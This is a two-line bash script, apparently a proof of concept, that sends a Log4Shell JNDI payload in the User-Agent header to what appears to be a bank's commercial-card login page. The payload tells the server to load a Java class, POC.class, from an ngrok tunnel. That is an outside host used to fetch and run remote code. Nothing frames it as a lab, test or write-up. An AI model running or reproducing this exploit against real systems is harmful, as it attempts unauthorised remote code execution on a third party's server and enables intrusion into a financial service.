#!/bin/bash

curl --header 'User-Agent: ${jndi:ldap://http://bb71-74-83-133-149.ngrok.io/POC.class}' 'https://commercialcard.53.com/portal/auth/login/Login/'